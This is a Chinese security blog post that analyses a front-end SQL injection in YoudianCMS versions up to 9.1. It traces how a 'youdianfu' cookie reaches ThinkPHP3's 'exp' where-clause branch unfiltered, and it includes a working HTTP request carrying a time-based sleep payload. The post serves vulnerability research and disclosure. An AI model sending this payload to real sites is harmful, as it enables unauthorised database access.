<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="John Doe" />
  <meta name="description" content="" />
  
  
  <title>
    
      友点CMS V9.1 前台SQL注入 
      
      
      |
    
     N0puple
  </title>

  
    <link rel="apple-touch-icon" href="/images/001.ico">
    <link rel="icon" href="/images/001.ico">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="/iconfont/iconfont.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">


  <!-- jquery3.3.1 -->
  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>

  <!-- fancybox -->
  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
  
<script src="/js/fancybox.js"></script>


  

<meta name="generator" content="Hexo 5.4.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/1.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">N0puple</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">主页</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">归档</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">标签</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">朋友</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">关于我</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->

<!-- LaTex Display -->
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
</script>
<script>
MathJax = {
  tex: {
    inlineMath: [['$', '$'], ['\\(', '\\)']]
  }
};
</script>



  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">友点CMS V9.1 前台SQL注入</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="Update time"></i>
          2021-06-30 20:56:15
        </span>
        
              <span class="post-tags">
                <i class="iconfont icon-tags" title="Tags"></i>
                
                <span class="span--tag">
                  <a href="/tags/php/" title="php">
                    <b>#</b> php
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
                    <b>#</b> sql注入
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/%E5%8F%8B%E7%82%B9cms/" title="友点cms">
                    <b>#</b> 友点cms
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>友点 CMS V9.1 前台存在 sql 注入，攻击者可获取数据库内容</p>
<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>youdiancms &lt;=9.1</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;index.php&#x2F;Channel&#x2F;voteAdd HTTP&#x2F;1.1</span><br><span class="line">Host: www.youdiancms90.com</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID&#x3D;pn9iofrfklen68u4205veml8s0; youdianAdminLangSet&#x3D;cn; XDEBUG_SESSION&#x3D;PHPSTORM; youdianfu[0]&#x3D;exp; youdianfu[1]&#x3D;&#x3D;(select 1 from(select sleep(3))a)</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><h3 id="变量控制"><a href="#变量控制" class="headerlink" title="变量控制"></a>变量控制</h3><p>这里首先有一个可以直接赋值的变量，在 <code>App/Lib/Action/HomeBaseAction.class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HomeBaseAction</span> <span class="keyword">extends</span> <span class="title">BaseAction</span> </span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$_fromUser</span> = <span class="string">&#x27;&#x27;</span>;  <span class="comment">//微信内部号</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="variable">$_isWx</span>=<span class="number">0</span>;  <span class="comment">//是否是微信浏览器访问</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">_initialize</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="built_in">parent</span>::_initialize();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_assignPublicVar();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;_assignConfigVar();</span><br><span class="line">		<span class="keyword">$this</span>-&gt;getTemplateConfig();</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//获取微信帐号=======================</span></span><br><span class="line">		<span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;fu&#x27;</span>])  &amp;&amp; !<span class="keyword">empty</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;fu&#x27;</span>]) )&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;_fromUser = <span class="variable">$_GET</span>[<span class="string">&#x27;fu&#x27;</span>];</span><br><span class="line">			cookie(<span class="string">&#x27;fu&#x27;</span>, <span class="keyword">$this</span>-&gt;_fromUser, <span class="number">31536000</span>); <span class="comment">//31536000秒＝1年，有效期为1年</span></span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>( cookie(<span class="string">&#x27;fu&#x27;</span>) ) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;_fromUser = cookie(<span class="string">&#x27;fu&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//===============================</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>主要看到下面赋值的位置，如果 <code>GET</code> 了一个 <code>fu</code> ，那么就会将这个的值赋值给 <code>cookie</code>，这里的 <code>cookie</code>方法可以跟进去看看，最后是加了一个前缀</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="variable">$config</span>[<span class="string">&#x27;prefix&#x27;</span>] . <span class="variable">$name</span>;</span><br></pre></td></tr></table></figure>

<p>最后是将 <code>GET</code> 的 <code>fu</code> 的值赋值给了 <code>youdianfu</code> </p>
<p>我们如果一开始就给 <code>youdianfu</code> 赋值，那么我们就可以直接控制变量 <code>$this-&gt;_fromUser</code></p>
<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>接下来可以找哪里用到了这个 <code>$this-&gt;_fromUser</code> ，可以直接搜索</p>
<p>我们这里使用参考文章中使用的 <code>voteAdd</code> 方法，在 <code>App/Lib/Action/Home/ChannelAction.class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">voteAdd</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line">    <span class="variable">$item</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;item&#x27;</span>];</span><br><span class="line">    <span class="variable">$appid</span> = intval(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;appid&#x27;</span>]);</span><br><span class="line">    <span class="variable">$fromUser</span> = !<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;_fromUser) ? <span class="keyword">$this</span>-&gt;_fromUser : get_client_ip();</span><br><span class="line">    <span class="variable">$_REQUEST</span> = YdInput::checkTextbox( <span class="variable">$_REQUEST</span> );</span><br><span class="line">    <span class="variable">$m</span> = D(<span class="string">&#x27;Admin/WxVote&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$m</span>-&gt;hasVoted(<span class="variable">$appid</span>, <span class="variable">$fromUser</span>) )&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ajaxReturn(<span class="literal">null</span>, <span class="string">&#x27;&#x27;</span>, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里会检测有没有 <code>$this-&gt;_fromUser</code> ，我们可以通过 <code>cookie</code> 设置，然后直接进入 <code>$m-&gt;hasVoted($appid, $fromUser)</code>，我们跟进 <code>App/Lib/Model/Admin/WxVoteModel.class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasVoted</span>(<span class="params"><span class="variable">$appid</span>, <span class="variable">$fromUser</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$where</span>[<span class="string">&#x27;AppID&#x27;</span>] = <span class="variable">$appid</span>;</span><br><span class="line">    <span class="variable">$where</span>[<span class="string">&#x27;FromUser&#x27;</span>] = <span class="variable">$fromUser</span>;</span><br><span class="line">    <span class="variable">$n</span> = <span class="keyword">$this</span>-&gt;where(<span class="variable">$where</span>)-&gt;count();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将 <code>$fromUser</code> 的值存进数组 <code>$where</code> ，然后调用 <code>$this-&gt;where</code> ，这个 <code>CMS</code> 的核心框架使用的是 <code>thinkphp3</code> ，<code>thinkphp3</code> 有一些 <code>sql</code> 注入漏洞，这里也是可以的，而且还没有 <code>I()</code> 函数保护</p>
<p>跟进 <code>$this-&gt;where($where)-&gt;count()</code> ，这里使用了魔术方法 <code>__call</code>，比较容易看懂，这里将值全部传进了 <code>$options</code> 然后进入 <code>$this-&gt;getField(strtoupper($method).&#39;(&#39;.$field.&#39;) AS tp_&#39;.$method)</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$options</span>[<span class="string">&#x27;field&#x27;</span>]    =  <span class="variable">$field</span>;</span><br><span class="line"><span class="variable">$options</span> =  <span class="keyword">$this</span>-&gt;_parseOptions(<span class="variable">$options</span>);</span><br><span class="line">...</span><br><span class="line"><span class="variable">$options</span>[<span class="string">&#x27;limit&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>

<p>将值全部存进 <code>$options</code>，我们可以看一下这里面的内容</p>
<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210630232219.png"></p>
<p>之后进入 <code>$this-&gt;db-&gt;select($options)</code>，在 <code>App/Core/Lib/Core/Db.class.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$options</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;model  =   <span class="variable">$options</span>[<span class="string">&#x27;model&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span>   = <span class="keyword">$this</span>-&gt;buildSelectSql(<span class="variable">$options</span>);</span><br><span class="line">    <span class="variable">$cache</span>  =  <span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;cache&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;cache&#x27;</span>]:<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$cache</span>) &#123; <span class="comment">// 查询缓存检测</span></span><br><span class="line">        <span class="variable">$key</span> =  is_string(<span class="variable">$cache</span>[<span class="string">&#x27;key&#x27;</span>])?<span class="variable">$cache</span>[<span class="string">&#x27;key&#x27;</span>]:md5(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$value</span>   =  S(<span class="variable">$key</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$cache</span>[<span class="string">&#x27;type&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="literal">false</span> !== <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$result</span>   = <span class="keyword">$this</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>这里获取 <code>model</code> 后进入 <code>$this-&gt;buildSelectSql($options)</code> ，这看起来像是构建 <code>sql</code> 语句的方法，接着进入 <code>$this-&gt;parseSql($this-&gt;selectSql,$options)</code> ，<code>$this-&gt;selectSql</code> 是查询语句模板</p>
<p><code>parseSql</code> 是获取 <code>$options</code> 中的值，然后替换模板得到最终的 <code>sql</code> 语句，我们来看看怎么获取到 <code>where</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;parseWhere(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>])?<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]:<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_string(<span class="variable">$where</span>)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; <span class="comment">// 使用数组或者对象条件表达式</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$where</span>[<span class="string">&#x27;_logic&#x27;</span>])) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">// 默认进行 AND 运算</span></span><br><span class="line">        <span class="variable">$operate</span>    =   <span class="string">&#x27; AND &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$where</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$whereStr</span> .= <span class="string">&#x27;( &#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">0</span>===strpos(<span class="variable">$key</span>,<span class="string">&#x27;_&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 解析特殊条件表达式</span></span><br><span class="line">            <span class="variable">$whereStr</span>   .= <span class="keyword">$this</span>-&gt;parseThinkWhere(<span class="variable">$key</span>,<span class="variable">$val</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 查询字段的安全过滤</span></span><br><span class="line">            <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[A-Z_\|\&amp;\-.a-z0-9\(\)\,]+$/&#x27;</span>,trim(<span class="variable">$key</span>)))&#123;</span><br><span class="line">                throw_exception(L(<span class="string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 多条件支持</span></span><br><span class="line">            <span class="variable">$multi</span> = is_array(<span class="variable">$val</span>) &amp;&amp;  <span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="string">&#x27;_multi&#x27;</span>]);</span><br><span class="line">            <span class="variable">$key</span> = trim(<span class="variable">$key</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos(<span class="variable">$key</span>,<span class="string">&#x27;|&#x27;</span>)) &#123; <span class="comment">// 支持 name|title|nickname 方式定义查询字段</span></span><br><span class="line">                <span class="variable">$array</span>   =  explode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$str</span>   = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$m</span>=&gt;<span class="variable">$k</span>)&#123;</span><br><span class="line">                    <span class="variable">$v</span> =  <span class="variable">$multi</span>?<span class="variable">$val</span>[<span class="variable">$m</span>]:<span class="variable">$val</span>;</span><br><span class="line">                    <span class="variable">$str</span>[]   = <span class="string">&#x27;(&#x27;</span>.<span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$k</span>),<span class="variable">$v</span>).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$whereStr</span> .= implode(<span class="string">&#x27; OR &#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">            &#125;<span class="keyword">elseif</span>(strpos(<span class="variable">$key</span>,<span class="string">&#x27;&amp;&#x27;</span>))&#123;</span><br><span class="line">                <span class="variable">$array</span>   =  explode(<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$str</span>   = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$m</span>=&gt;<span class="variable">$k</span>)&#123;</span><br><span class="line">                    <span class="variable">$v</span> =  <span class="variable">$multi</span>?<span class="variable">$val</span>[<span class="variable">$m</span>]:<span class="variable">$val</span>;</span><br><span class="line">                    <span class="variable">$str</span>[]   = <span class="string">&#x27;(&#x27;</span>.<span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$k</span>),<span class="variable">$v</span>).<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$whereStr</span> .= implode(<span class="string">&#x27; AND &#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$whereStr</span>   .= <span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$key</span>),<span class="variable">$val</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$whereStr</span> .= <span class="string">&#x27; )&#x27;</span>.<span class="variable">$operate</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$whereStr</span> = substr(<span class="variable">$whereStr</span>,<span class="number">0</span>,-strlen(<span class="variable">$operate</span>));</span><br></pre></td></tr></table></figure>

<p>这里我把无关紧要的语句全部用 <code>...</code> 代替了</p>
<p>我们的 <code>$where</code> 值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AppID&#x3D;0</span><br><span class="line">FromUser&#x3D;[&#39;exp&#39;,&#39;&#x3D;(select 1 from (select sleep(3))a)&#39;]</span><br></pre></td></tr></table></figure>

<p>根据值来判断，取到 <code>FromUser</code> 的时候，我们会来到这里</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span>   .= <span class="keyword">$this</span>-&gt;parseWhereItem(<span class="keyword">$this</span>-&gt;parseKey(<span class="variable">$key</span>),<span class="variable">$val</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^(EQ|NEQ|GT|EGT|LT|ELT|NOTLIKE|LIKE)$/i&#x27;</span>,<span class="variable">$val</span>[<span class="number">0</span>])) &#123; <span class="comment">// 比较运算</span></span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="keyword">$this</span>-&gt;comparison[strtolower(<span class="variable">$val</span>[<span class="number">0</span>])].<span class="string">&#x27; &#x27;</span>.<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="string">&#x27;exp&#x27;</span>==strtolower(<span class="variable">$val</span>[<span class="number">0</span>]))&#123; <span class="comment">// 使用表达式</span></span><br><span class="line">            <span class="variable">$whereStr</span> .= <span class="string">&#x27; (&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>].<span class="string">&#x27;) &#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&#x27;/^(NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="variable">$val</span>[<span class="number">0</span>]))&#123; <span class="comment">// IN 运算</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$val</span>[<span class="number">2</span>]) &amp;&amp; <span class="string">&#x27;exp&#x27;</span>==<span class="variable">$val</span>[<span class="number">2</span>]) &#123;</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.strtoupper(<span class="variable">$val</span>[<span class="number">0</span>]).<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                     <span class="variable">$val</span>[<span class="number">1</span>] =  explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$val</span>[<span class="number">1</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$zone</span>   =   implode(<span class="string">&#x27;,&#x27;</span>,<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$val</span>[<span class="number">1</span>]));</span><br><span class="line">                <span class="variable">$whereStr</span> .= <span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.strtoupper(<span class="variable">$val</span>[<span class="number">0</span>]).<span class="string">&#x27; (&#x27;</span>.<span class="variable">$zone</span>.<span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&#x27;/(NOTBETWEEN|NOT BETWEEN|BETWEEN)/i&#x27;</span>,<span class="variable">$val</span>[<span class="number">0</span>]))&#123; <span class="comment">// BETWEEN运算</span></span><br><span class="line">            <span class="variable">$data</span> = is_string(<span class="variable">$val</span>[<span class="number">1</span>])? explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$val</span>[<span class="number">1</span>]):<span class="variable">$val</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="variable">$whereStr</span> .=  <span class="string">&#x27; (&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.strtoupper(<span class="variable">$val</span>[<span class="number">0</span>]).<span class="string">&#x27; &#x27;</span>.<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$data</span>[<span class="number">0</span>]).<span class="string">&#x27; AND &#x27;</span>.<span class="keyword">$this</span>-&gt;parseValue(<span class="variable">$data</span>[<span class="number">1</span>]).<span class="string">&#x27; )&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            throw_exception(L(<span class="string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="string">&#x27;:&#x27;</span>.<span class="variable">$val</span>[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到 <code>$val[0]</code> 是字符串的时候，如果 <code>$val[0]= exp</code> ，那么就会直接拼接 <code>$val[1]</code> </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whereStr</span> .= <span class="string">&#x27; (&#x27;</span>.<span class="variable">$key</span>.<span class="string">&#x27; &#x27;</span>.<span class="variable">$val</span>[<span class="number">1</span>].<span class="string">&#x27;) &#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>就会变成</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(`FromUser` <span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> sleep(<span class="number">3</span>))a))</span><br></pre></td></tr></table></figure>

<p>这里需要 <code>$val[1]</code> 自己带上一个等于号</p>
